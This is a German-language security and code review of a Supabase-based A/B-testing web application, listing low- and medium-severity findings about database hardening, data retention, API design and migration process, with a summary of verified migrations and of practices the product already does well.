## NEW-04 — `handle_new_user()` hat `set search_path = public` statt `= ''`

**Schweregrad: Niedrig** · Datenbank

**Problem:** `005_auth_billing.sql:25`: `set search_path = public`. Migration 024 und 026 haben die Grants auf die betroffenen Objekte entzogen, das Restrisiko ist minimiert — aber `set search_path = ''` ist die gehärtete Form und kostet nichts. Der Plan DB-06 dokumentierte das bereits.

**Lösung:** Eine Zeile in `005` ändern. Kein Risiko — die Funktion läuft seit 024/026 ohnehin ohne Zugriff auf die kritischen Funktionen. Der Fix ist rein defensiv.

---

## NEW-05 — Keine Retention für `daily_stats`

**Schweregrad: Mittel** · Datenbank

**Problem:** Migration 033 erweitert `cleanup_retention_data()` um Events (12 Monate) und Agent-Runs (6 Monate). `daily_stats` hat keine Retention. Die Tabelle wächst mit einem Eintrag pro Test und Tag — bei 100 aktiven Tests sind das ~36.500 Zeilen/Jahr. Kein akutes Problem, aber strukturell inkonsistent: das dokumentierte Löschkonzept sollte alle Tabellen mit Zeitreihendaten abdecken.

**Lösung:** `delete from daily_stats where date < now() - interval '12 months'` in `cleanup_retention_data()` ergänzen.

---

## NEW-06 — `.env.example` dokumentiert tote Features

**Schweregrad: Niedrig** · Wartbarkeit

**Problem:** `.env.example:52-56` dokumentiert `PREVIEW_DAILY_IP_LIMIT`, `PREVIEW_DAILY_GLOBAL_LIMIT`, `REFINE_DAILY_IP_LIMIT`, `REFINE_DAILY_GLOBAL_LIMIT`. Diese API-Endpunkte (`/api/preview`, `/api/refine`) existieren nicht (wurden in CODE-01 bereits als toter Code identifiziert). Ein neuer Entwickler, der die `.env.example` kopiert, konfiguriert Features, die nirgends implementiert sind.

**Lösung:** Die vier Zeilen aus `.env.example` entfernen. Gehören sie zu einem geplanten Feature, gehören sie in ein Spec-Dokument, nicht in die Env-Doku.

---

## NEW-07 — `goal_selector` im Wizard-Body aber nicht in der DB

**Schweregrad: Niedrig** · Datenintegrität

**Problem:** `test-wizard/create/route.ts:60` deklariert `goal_selector` im `CreateTestBody`-Interface, `:72` validiert es auf Länge — aber `:136-148` schreibt es **nicht** in den Insert. Der Kommentar („wurde nie per Migration angelegt") bestätigt das. Das Feld ist also eine validierte, aber verworfene Benutzereingabe.

Entweder die Migration nachholen (Spalte `goal_selector text` in `tests`) oder das Feld aus Interface und Validierung entfernen. Der aktuelle Zustand ist irreführend: der Client sendet Daten, die der Server akzeptiert und still verwirft.

**Lösung:** Entscheiden. Wenn `goal_selector` für ab.js gebraucht wird (der Kommentar in `ab.js:646-648` deutet darauf hin), eine Migration anlegen und in den Insert aufnehmen. Wenn nicht, aus dem Interface entfernen.

---

## NEW-08 — PATCH `/api/tests/[id]` erlaubt kein `traffic_split`

**Schweregrad: Niedrig** · API-Design

**Problem:** POST `/api/tests` validiert und akzeptiert `traffic_split` (seit Block 3 mit Range-Check). PATCH `/api/tests/[id]` hat das Feld weder im Interface noch im Patch-Objekt. Der Kunde kann den Traffic-Split nach der Erstellung nicht mehr ändern.

Das kann Absicht sein (kein nachträgliches Manipulieren des Splits im laufenden Test) — ist aber nirgends dokumentiert, und das UI bietet keinen Hinweis darauf.

**Lösung:** Entweder `traffic_split` als änderbar in PATCH aufnehmen (mit derselben 0–100-Validierung), oder im UI dokumentieren, dass der Split nur bei Erstellung gesetzt werden kann.

---

## NEW-09 — `paused` ist kein Pause-Status für `/api/resolve`

**Schweregrad: Niedrig** · API-Verhalten

**Problem:** `/api/resolve:59` filtert `.not('status', 'eq', 'paused')`. Das bedeutet: `paused`-Tests werden **nicht** ausgeliefert. Die Crons (`check-winners:36`) behandeln `paused` aber wie `active` (`.in('status', ['active','paused'])`) — korrekt, ein pausierter Test soll weiter auf Winner geprüft werden, nur nicht ausgeliefert. Allerdings: `updateTests` (`PATCH`) setzt bei `paused → draft` nicht `'resumed'` als Event-Typ (`tests/[id]/route.ts:98`), nur bei `draft && oldStatus === 'paused'` — was nie vorkommt, weil der Statuswechsel `paused → draft` nicht existiert. Das State-Modell hat Lücken.

Kein akuter Fehler, aber ein API-Design, das sich bei der nächsten Status-Erweiterung rächen wird.

**Lösung:** State-Machine dokumentieren (welche Transitionen sind erlaubt?) und in CHECK-Constraints abbilden.

---

## NEW-10 — Migration 033 ersetzt `cleanup_retention_data()` — kein CI-Check

**Schweregrad: Niedrig** · Prozess

**Problem:** Die Funktion `cleanup_retention_data()` wurde ursprünglich in `011_data_cleanup.sql` angelegt und in `033_perf_indexes_retention.sql` per `create or replace` erweitert. Der Prozess ist korrekt (033 läuft nach 011), aber:

- Ein Leser von 011 sieht nicht, dass die Funktion später ersetzt wurde.
- Der Zustand ist nicht in `schema_migrations` abbildbar (die Tabelle trackt nur, dass Migrationen liefen, nicht was sie taten).
- Läuft 011 jemals erneut (manuell, aus Versehen), überschreibt es die erweiterte Version.

Das ist ein grundsätzliches Problem des manuellen Migrationsprozesses. Die Lösung (Supabase CLI mit Zeitstempel-Präfixen, siehe DB-01 Lösung Punkt 5) würde es beheben, steht aber noch aus.

**Lösung:** In 011 einen Kommentar ergänzen, der auf 033 verweist. Mittelfristig auf `supabase db push` umstellen.

---

## Zusammenfassung: Migrations-Integrationstest

**Migration 029** (`schema_migrations`): ✅
- Tabelle mit RLS angelegt, Backfill 001–028 korrekt
- Von `schema_migrations` selbst eingetragen
- `/api/health` nutzt sie für DB-Readiness-Check
- Alle Folgemigrationen (030–033) tragen sich ein

**Migration 030** (`enable_rls_gap`): ✅
- RLS + FORCE auf `waitlist`, `temp_sessions`, `stripe_webhook_events`
- Grants auf allen drei Tabellen entzogen
- SEC-04 damit vollständig geschlossen

**Migration 031** (`temp_session_budget`): ✅
- `gen_count`/`test_count`-Spalten + atomare RPC-Funktionen (TOCTOU-frei)
- `consume_temp_session_gen` in `/api/generate:393` integriert
- `consume_temp_session_test` in `/api/tests:107` integriert
- Limits: 3 Generierungen + 3 Tests pro Temp-Session
- Index `idx_temp_sessions_created` erstellt, redundanter `idx_temp_sessions_token` entfernt

**Migration 032** (`integrity_constraints`): ✅
- 7 CHECK-Constraints auf `tests`, 1 auf `profiles` — alle `not valid` → `validate`
- Waisenbereinigung (`user_id IS NULL AND temp_session_id IS NULL`) vor Constraint
- FK-Cascade (`ON DELETE SET NULL` → `ON DELETE CASCADE`) auf `tests.temp_session_id`
- API-Validierung für `traffic_split` und `significance_level` vorhanden
- `resolve/route.ts:66` filtert `user_id IS NOT NULL` als Backstop

**Migration 033** (`perf_indexes_retention`): ✅
- `idx_events_user`, `idx_tests_status_winner`, `idx_webhook_processed_at` angelegt
- `cleanup_retention_data()` um Events (12M) und Agent-Runs (6M) Retention erweitert
- `replica identity default` auf `tests` (Hot-Path-Entlastung)
- Alle Cron-Queries profitieren von den neuen Indizes

**Kein Regression-Risiko durch die Migrationen.** Die Anwendung kompiliert und alle statischen Checks laufen. Die Migrationen sind rein additiv (neue Constraints als `not valid` + `validate`), keine Spalten oder Tabellen gelöscht, keine bestehenden Policies geändert. Die einzige destruktive Operation (`delete from tests where …`) löscht ausschließlich nachweislich herrenlose Zeilen.

---

# Was bereits gut gelöst ist

Damit das Bild vollständig ist — diese Dinge sind überdurchschnittlich gut gemacht und sollten beim Aufräumen nicht versehentlich beschädigt werden:

**Datenbank**
- Kein einziges `using (true)` im gesamten Repo. Alle acht RLS-geschützten Tabellen sind korrekt über `auth.uid() = user_id` tenant-isoliert.
- Geldbeträge durchgängig `numeric`, nie `float`. Alle Zeitstempel `timestamptz`.
- `increment_gen_cost` (`027:12-46`) ist TOCTOU-frei in einer Transaktion — genau die Race-Condition, an der solche Limits sonst scheitern.
- Foreign Keys nahezu lückenlos mit sinnvollen `ON DELETE`-Aktionen.
- `021_resolve_scaling.sql` ist eine vorbildlich dokumentierte Performance-Migration — inklusive Paritätstest (`__tests__/resolve-host-parity.mjs`), der die SQL-Normalisierung gegen `hostOf()` absichert.

**Datenschutz-Architektur**
- `/api/resolve` verzichtet bewusst auf serverseitiges Pfad-Tracking; der Client filtert per `pathMatches()`. Der Server sieht nur die Domain, nie das Surfverhalten. Das ist eine Designentscheidung, die Geld gekostet hat.
- Keine IPs, keine User-Agents in der Datenbank.
- PII-Scanner vor jedem OpenAI-Call, mit zwei sauber getrennten Strategien (`scanPII` blockt eigene Elemente, `redactPII` maskiert fremde Seiten).
- `lib/safeLog.ts` verhindert, dass rohe Postgres-Fehler mit Query-Details in Logs landen.

**Frontend**
- Error- und Loading-States sind flächendeckend und sauber gebaut: `error.tsx`, `global-error.tsx` (bewusst mit Inline-Styles, weil die CSS-Pipeline genau dann kaputt sein könnte — die Begründung im Kommentar stimmt), `not-found.tsx`, Route-spezifische Varianten, plus eine Class-basierte ErrorBoundary.
- Empty States sind kontextabhängig: `EmptyDashboard` unterscheidet „keine Domain" von „keine Tests" und bietet jeweils die richtige Aktion. Besser als in den meisten Produkten dieser Reifestufe.
- Polling wurde durch Supabase-Realtime ersetzt, mit sauberem Channel-Cleanup und Ref-Pattern gegen stale Closures. Keine Memory Leaks gefunden.
- Destruktive Aktionen überwiegend gut abgesichert: Account-Löschung verlangt die Eingabe von `delete <email>`, Test-Löschung nutzt Inline-Confirm statt `window.confirm`, die API verlangt zusätzlich `?confirm=true`.
- `VariantPreview` rendert fremdes HTML korrekt isoliert: `sandbox=""`, `pointerEvents:'none'`, `loading="lazy"`.
- Server-seitiges Fetching auf drei von vier Seiten korrekt parallelisiert, mit expliziter Spaltenauswahl statt `select('*')`.

**Sonstiges**
- Security-Header sind durchdacht und dokumentiert (`next.config.ts`) — inklusive nachvollziehbarer Begründung für jede CSP-Direktive.
- SRI für `ab.js` ist implementiert, mit dokumentiertem Prozess.
- Die Rechtstexte sind ungewöhnlich sorgfältig: alle sechs Sub-Prozessoren tabellarisch mit Standort und Rechtsgrundlage, konkrete Löschfristen, zuständige Aufsichtsbehörde benannt. Das Impressum ist auf DDG-Stand, nicht mehr TMG.
- `docs/runbook.md` ist ein echtes Incident-Runbook mit Szenarien, RTO/RPO und konkreten Befehlen — selten in diesem Reifegrad.
- 89 E2E-Tests über neun Specs. Sie müssen nur endlich laufen.

---

## Quellen dieser Analyse

**Erste Analyse (22.07.2026):** Vollständige Lektüre von: allen 40 API-Routen, `public/ab.js`, `proxy.ts`, allen `lib/`-Modulen, allen 31 Migrationen, `next.config.ts`, `vercel.json`, CI-Workflow, sowie den Frontend-Dateien unter `app/` und `components/`. Der Sanitizer-Bypass in SEC-01 wurde empirisch mit neun Payloads gegen die tatsächliche Implementierung verifiziert; die RLS-Lücke in SEC-04 per `grep` über alle `enable row level security`-Vorkommen; der tote CI-Trigger per `git branch -a`; die fehlende ESLint-Konfiguration per `npx eslint .`.

**Zweite Analyse (23.07.2026) — Migrationen 029–033:** Vollständige Lektüre aller fünf neuen Migrationen und aller davon betroffenen Anwendungscode-Dateien. Geprüft wurde: Schema-Korrektheit (Spalten, Constraints, Indizes), Integration mit den API-Routen (RPC-Aufrufe, Auth, Validierung), Abwesenheit von Regressionen (keine gelöschten Spalten/Tabellen, keine geänderten Policies). Jede Migration wurde gegen den im Plan dokumentierten Fix abgeglichen. Die 10 neuen Baustellen ergaben sich aus strukturellen Lücken, die beim Integrationstest sichtbar wurden — keine sind durch die Migrationen verursacht.

**Dritte Analyse (23.07.2026) — Session 2: Waves 1–6.** Geprüft und bearbeitet: `lib/rateLimit.ts` (Circuit-Breaker + Redis-Fallback), `lib/pii.ts` (Phone-Regex), `lib/cors.ts` (CORS-Trennung), `app/api/profile/avatar/route.ts` (Magic Bytes), `app/auth/callback/route.ts` (Safe-Next-Validator), `app/api/tests/[id]/route.ts` (traffic_split in PATCH), `app/api/capture/route.ts` (Längenlimits), `app/api/temp-session/route.ts` (count:planned), `app/api/results/[id]/route.ts` (404 statt 401), `app/api/generate/route.ts` (Circuit-Breaker-Integration), `app/api/test-wizard/create/route.ts` (goal_selector entfernt), `app/globals.css`, `components/ErrorBoundary.tsx`, `components/NewTestDrawer.tsx` (dvh + focus-visible), `.env.example`, `.gitignore`, `db/migrations/005/011/028/033/034`, `__tests__/sanitize.mjs` (15 Szenarien), `hooks/useFocusTrap.ts` (neu). Alle Änderungen durch `tsc --noEmit` (clean) verifiziert.

**Vierte Analyse (23.07.2026) — Session 3: Restbestand.** Geprüft und bearbeitet: `lib/safeFetch.ts` (DNS-Prüfung + private-IP), `lib/cors.ts` (corsHeadersPublic/corsHeaders), `lib/auth.ts` (Token-Hashing SHA-256), `app/api/assign/route.ts` (signed HMAC tokens), `app/api/event/route.ts` (token verification), `app/api/resolve/route.ts` (corsHeadersPublic), `app/api/suggestions/route.ts` (safeFetch-Refaktor), `app/api/test-wizard/scan/route.ts` (safeFetch-Refaktor), `app/og/route.tsx` (CDN-Fallback), `public/ab.js` (Token-Pass-Through), `app/layout.tsx` (Skip-Link), `app/signup/page.tsx` (Passwort-Bestätigung + Ladezustand), `app/login/page.tsx` (Ladezustand), `app/onboarding/page.tsx` (Ladezustand), `app/dashboard/account/page.tsx` (Promise.all), `app/components/NotificationCenter.tsx` (sort-fix + try/catch), `app/dashboard/components/new-test/StepReview.tsx` (Label-Fix), `components/TechLogos.tsx` (Framer/Squarespace entfernt), `db/migrations/020_test_health.sql` (Warn-Kommentar), `docs/avv-vorlage.md` (neu), `package.json` (gsap entfernt). Alle Änderungen durch `tsc --noEmit` (clean) verifiziert.
